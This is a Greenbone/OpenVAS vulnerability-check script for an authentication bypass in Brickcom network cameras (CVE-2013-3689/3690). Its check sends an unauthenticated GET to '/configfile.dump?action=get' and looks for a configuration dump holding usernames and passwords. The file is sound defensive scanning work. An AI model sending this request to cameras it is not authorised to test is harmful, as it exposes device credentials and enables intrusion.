CPE_PREFIX = "cpe:/h:brickcom";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103738" );
	script_version( "2020-05-15T09:07:27+0000" );
	script_cve_id( "CVE-2013-3689", "CVE-2013-3690" );
	script_bugtraq_id( 60525, 60526 );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_tag( name: "last_modification", value: "2020-05-15 09:07:27 +0000 (Fri, 15 May 2020)" );
	script_tag( name: "creation_date", value: "2013-06-12 13:41:30 +0200 (Wed, 12 Jun 2013)" );
	script_name( "Multiple Brickcom Devices Authentication Bypass Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/53767" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/84924" );
	script_xref( name: "URL", value: "http://cxsecurity.com/issue/WLB-2013060108" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/122003" );
	script_xref( name: "URL", value: "http://www.securelist.com/en/advisories/53767" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2013/Jun/84" );
	script_xref( name: "URL", value: "http://archives.neohapsis.com/archives/secunia/current/0109.html" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Privilege escalation" );
	script_dependencies( "gb_brickcom_network_camera_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "brickcom/network_camera/detected" );
	script_tag( name: "summary", value: "The remote host is a Brickcom device and it is prone to an
  authentication bypass vulnerability." );
	script_tag( name: "impact", value: "By requesting the URL '/configfile.dump' via parameter 'action' and value 'get' it was possible to dump the config
  (including username and password) of this device." );
	script_tag( name: "solution", value: "Apply the latest available patch." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!infos = get_app_port_from_cpe_prefix( cpe: CPE_PREFIX, service: "www" )){
	exit( 0 );
}
port = infos["port"];
CPE = infos["cpe"];
if(!get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = "/configfile.dump?action=get";
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
if(ContainsString( buf, "UserSetSetting.userList.users0.password" ) && ContainsString( buf, "UserSetSetting.userList.users0.username" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

